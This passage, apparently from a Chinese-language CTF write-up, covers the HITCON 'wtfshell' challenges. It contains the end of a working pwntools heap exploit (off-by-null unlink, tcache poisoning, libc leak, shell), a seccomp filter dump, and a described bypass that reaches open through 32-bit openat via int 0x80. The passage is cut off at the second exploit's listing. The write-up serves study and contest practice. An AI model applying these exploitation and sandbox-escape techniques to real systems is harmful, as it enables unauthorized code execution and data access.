recover_data(filename,no_null_payload[<span class="number">0</span>:whole_size-i-<span class="number">2</span>])</span><br><span class="line">            <span class="comment"># debug(&quot;free&quot;)</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">                            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_user(<span class="string">b&#x27;what&#x27;</span>)</span><br><span class="line">add_user(<span class="string">b&#x27;lotus&#x27;</span>)</span><br><span class="line">heap_base=burp(<span class="string">b&#x27;lotus&#x27;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x40</span>)-<span class="number">0x880</span></span><br><span class="line">key = heap_base&gt;&gt;<span class="number">12</span></span><br><span class="line"><span class="comment"># for i in range(0x7):</span></span><br><span class="line"><span class="comment"># new_file(b&#x27;chunk1&#x27;,b&#x27;3&#x27;)</span></span><br><span class="line"><span class="comment"># add_data(b&#x27;chunk1&#x27;)</span></span><br><span class="line">new_file(<span class="string">b&#x27;big&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">    new_file(<span class="string">b&quot;chunk&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    new_file(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">new_file(<span class="string">b&#x27;chunk21&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;chunk22&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4</span>):</span><br><span class="line">        add_data(<span class="string">b&quot;chunk&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2</span>):</span><br><span class="line">        add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line">    add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+<span class="string">b&#x27;\n&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>):</span><br><span class="line">    recover_data(<span class="string">b&quot;chunk2&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2</span>):</span><br><span class="line">        add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line">    add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+<span class="string">b&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">[add_data(<span class="string">b&#x27;big&#x27;</span>,p16(<span class="number">0x1650</span>)+<span class="string">b&#x27;/&#x27;</span>*(<span class="number">0x100</span>-<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;big&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x100</span>,<span class="string">b&#x27;3&#x27;</span>)<span class="comment">#use to get the free 0x110 tcache and add a chunk between the unsortedbin and the top chunk</span></span><br><span class="line"></span><br><span class="line">add_data(<span class="string">b&#x27;big&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)<span class="comment"># free the unsortedbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add 0x408 back</span></span><br><span class="line">[add_data(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#add 0x521 chunk to off-by-null</span></span><br><span class="line">[add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x5</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">[delete_file(<span class="string">b&quot;chunk&quot;</span>+<span class="built_in">str</span>(i).encode()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>)]</span><br><span class="line"></span><br><span class="line">add_data(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete_all()</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;useless_chunk&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">[add_data(<span class="string">b&#x27;useless_chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;useless_chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add a 0x321 chunk and edit its fake_next_size</span></span><br><span class="line">new_file(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">[add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">[recover_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*(<span class="number">0x2ff</span>-i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>)]</span><br><span class="line">recover_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*(<span class="number">0x2ff</span>-<span class="number">6</span>)+<span class="string">b&#x27;\x09&#x27;</span>)</span><br><span class="line"></span><br><span class="line">menu(<span class="string">b&#x27;rip.&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x400</span>-<span class="number">4</span>))<span class="comment">#make off by null and clear the prev_size</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x9</span>):</span><br><span class="line">    new_file(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x9</span>):</span><br><span class="line">    recover_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;i&#x27;</span>*<span class="number">0x2f0</span>)</span><br><span class="line"></span><br><span class="line">fake_point = heap_base+<span class="number">0x2af0</span></span><br><span class="line">fake_point_addr = fake_point+<span class="number">0x30</span></span><br><span class="line">fake_unlink_chunk = <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x1651</span>)+p64(fake_point_addr-<span class="number">0x18</span>)+p64(fake_point_addr-<span class="number">0x10</span>)+p64(fake_point_addr-<span class="number">0x20</span>)+p64(fake_point_addr-<span class="number">0x18</span>)+p64(fake_point)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_addr(<span class="string">b&#x27;chunk15&#x27;</span>,fake_unlink_chunk,<span class="built_in">len</span>(fake_unlink_chunk)-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">[delete_file(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4</span>)]</span><br><span class="line">delete_file(<span class="string">b&#x27;chunk17&#x27;</span>)</span><br><span class="line">delete_file(<span class="string">b&#x27;chunk18&#x27;</span>)</span><br><span class="line">delete_file(<span class="string">b&#x27;chunk16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#off by null unlink</span></span><br><span class="line"></span><br><span class="line">delete_file(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#clear the tcache list 0x20</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xa</span>):</span><br><span class="line">    new_file(<span class="string">b&#x27;useless&#x27;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    recover_data(<span class="string">b&#x27;useless&#x27;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2e0</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x2d0</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak_libc_base</span></span><br><span class="line">show_file(<span class="string">b&#x27;chunk14&#x27;</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\0&#x27;</span>))-<span class="number">0x1f6cc0</span></span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x220</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;edit_tcache_next&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">recover_data(<span class="string">b&#x27;edit_tcache_next&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x220</span>)</span><br><span class="line">write_addr(<span class="string">b&#x27;edit_tcache_next&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">192</span>+p64((heap_base+<span class="number">0x330</span>)^(key+<span class="number">3</span>)),<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;go_attack&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">recover_data(<span class="string">b&#x27;go_attack&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">write_addr(<span class="string">b&#x27;go_attack&#x27;</span>,p32(<span class="number">1</span>)+p32(<span class="number">0x3</span>)+p64(<span class="number">0xdeadbeef</span>)+<span class="string">b&#x27;lotuslotus&#x27;</span>,<span class="number">0x1a</span>)</span><br><span class="line"></span><br><span class="line">show_file(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># debug(&quot;malloc_printerr&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">qwq(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">qwq(libc_base)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>psï¼šexp è¿è¡Œä¸€æ¬¡å¯èƒ½ä¸èƒ½æˆåŠŸï¼Œä¾§ä¿¡é“çˆ†ç ´ä»¥åŠ <code>write_addr</code>  ä¼¼ä¹æœ‰æŸäº› bugï¼Œä¸è¿‡å¤šè¿è¡Œå‡ æ¬¡å°±èƒ½é€šã€‚</strong></p>
<h2 id="wtfshell2"><a class="markdownIt-Anchor" href="#wtfshell2">#</a> wtfshell2</h2>
<p>wtfshell2 åªç”¨è€ƒè™‘å¦‚ä½•ç»•è¿‡æ²™ç›’ï¼Œå¹¶ä¸”åŠ«æŒç¨‹åºæµå³å¯ã€‚</p>
<p>åŠ«æŒ <code>strtok</code>  çš„ libc-got è¡¨ä¸º <code>magic_gadget</code> ï¼Œç„¶åå¯åŠ«æŒç¨‹åºæµã€‚</p>
<p>æ²™ç›’æ˜¯ç™½åå•ï¼Œæ²¡æœ‰ openã€‚æ²™ç›’ç»•è¿‡å¡æ‰äº†ä¸€ä¸ªè§£ï¼Œ <code>wtfshell2</code>  æ¯” <code>wtfshell1</code>  å°‘äº†ä¸€ä¸ªè§£ã€‚ <code>wtfshell2</code>  ç›¸æ¯”ä¸ <code>wtfshell1</code>  å°±æ˜¯å¤šäº†æ²™ç›’ã€‚å› ä¸ºæˆ‘ä»¬åœ¨ <code>wtfshell1</code>  ä¸­å·²ç»æ‹¿åˆ°äº†ä»»æ„åœ°å€å†™ï¼Œå’Œ <code>heap_base</code> ï¼Œ <code>libc_base</code> ï¼Œ <code>wtfshell2</code>  è€ƒå¯Ÿçš„å°±æ˜¯å¦‚ä½•ç»•è¿‡æ²™ç®±å†™ <code>orw</code> ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">zb@ubuntu:~/seccomp-tools$ seccomp-tools dump /mnt/hgfs/ubuntu/hitcon/heap/share/wtfshell</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0006: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0009: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0010: 0x15 0x00 0x06 0x00000009  if (A != mmap) goto 0017</span><br><span class="line"> 0011: 0x20 0x00 0x00 0x00000020  A = prot # mmap(addr, len, prot, flags, fd, pgoff)</span><br><span class="line"> 0012: 0x15 0x03 0x00 0x00000007  if (A == 0x7) goto 0016</span><br><span class="line"> 0013: 0x20 0x00 0x00 0x00000030  A = fd # mmap(addr, len, prot, flags, fd, pgoff)</span><br><span class="line"> 0014: 0x15 0x00 0x01 0xffffffff  if (A != 0xffffffff) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0016: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0017: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x0000000b  if (A != munmap) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0020: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0021: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0023</span><br><span class="line"> 0022: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0023: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0024: 0x15 0x00 0x01 0x00000027  if (A != getpid) goto 0026</span><br><span class="line"> 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0026: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0027: 0x15 0x00 0x01 0x00000066  if (A != getuid) goto 0029</span><br><span class="line"> 0028: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0029: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0030: 0x15 0x00 0x01 0x00000068  if (A != getgid) goto 0032</span><br><span class="line"> 0031: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0032: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0033: 0x15 0x00 0x04 0x00000014  if (A != writev) goto 0038</span><br><span class="line"> 0034: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)</span><br><span class="line"> 0035: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0037</span><br><span class="line"> 0036: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0037: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0038: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0039: 0x15 0x00 0x05 0x0000003c  if (A != exit) goto 0045</span><br><span class="line"> 0040: 0x20 0x00 0x00 0x00000010  A = error_code # exit(error_code)</span><br><span class="line"> 0041: 0x15 0x01 0x00 0x00000000  if (A == 0x0) goto 0043</span><br><span class="line"> 0042: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0044</span><br><span class="line"> 0043: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0044: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0045: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0046: 0x15 0x00 0x05 0x000000e7  if (A != exit_group) goto 0052</span><br><span class="line"> 0047: 0x20 0x00 0x00 0x00000010  A = error_code # exit_group(error_code)</span><br><span class="line"> 0048: 0x15 0x01 0x00 0x00000000  if (A == 0x0) goto 0050</span><br><span class="line"> 0049: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0051</span><br><span class="line"> 0050: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0051: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0052: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0053: 0x15 0x00 0x03 0x00000127  if (A != preadv) goto 0057</span><br><span class="line"> 0054: 0x20 0x00 0x00 0x00000010  A = fd # preadv(fd, vec, vlen, pos_l, pos_h)</span><br><span class="line"> 0055: 0x25 0x00 0x01 0x00000002  if (A &lt;= 0x2) goto 0057</span><br><span class="line"> 0056: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0057: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
<p>æ²™ç›’ç»•è¿‡æ˜¯ç”± <code>winmt</code>  å¸ˆå‚…çœ‹å‡ºæ¥çš„ğŸ¥°ï¼Œæ²™ç›’å¤§æ‰‹å­ï¼Œå¤ªğŸ‚äº†</p>
<ul>
<li>mmap ä¸€å—å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ï¼ˆæ²™ç›’ ban äº† mmap å‚æ•° 7ï¼Œä½†æ˜¯æ²¡æœ‰ ban 6ï¼‰ã€‚</li>
<li>read shellcode åˆ° mmap å‡ºæ¥çš„å†…å­˜ã€‚</li>
<li>shellcode è¿›è¡Œ orwã€‚</li>
</ul>
<p>ä½†æ˜¯ç¨‹åºæœ¬èº«æ˜¯ç™½åå•ï¼Œå¹¶æ²¡æœ‰å…è®¸ <code>open</code> ï¼Œè¿™è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>å¯ä»¥çœ‹åˆ°æ²™ç›’æ²¡æœ‰åˆ¤æ–­æ¶æ„ï¼Œè€Œå…è®¸äº† <code>preadv</code></p>
<p>è€Œ <code>preadv</code>  åœ¨ 64 ä½ä¸‹è°ƒç”¨å·ä¸ºï¼š</p>
<p><img data-src="https://tvax3.sinaimg.cn/large/008qDYGVgy1h8ob64pju0j30bg0283z4.jpg" alt="4"></p>
<p>åŒæ—¶ <code>openat</code>  åœ¨ 32 ä½ä¸‹è°ƒç”¨å·ä¸ºï¼š</p>
<p><img data-src="https://tva4.sinaimg.cn/large/008qDYGVgy1h8ob6w20gfj30bs02n0tq.jpg" alt="5"></p>
<p>å› æ­¤ç›´æ¥å¯ç”¨ <code>int0x80</code>  è°ƒç”¨ 32 ä½ä¸‹çš„ <code>openat</code> ã€‚</p>
<p>æ³¨æ„æ²™ç›’é‡Œåˆ¤æ–­äº† <code>preadv</code>  çš„ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦å¤§äº 2ï¼Œå› æ­¤æˆ‘ä»¬ <code>openat</code>  çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¹Ÿéœ€è¦å¤§äº 2ï¼Œè€Œå½“ <code>openat</code>  ä½¿ç”¨ç»å¯¹è·¯å¾„çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸å½±å“ç»“æœï¼Œæ•…è¿™é‡Œæœ€å¥½ç”¨ç»å¯¹è·¯å¾„ <code>/flag2</code> ã€‚</p>
<h3 id="wtrshell2-exp"><a class="markdownIt-Anchor" href="#wtrshell2-exp">#</a> wtrshell2-exp</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span 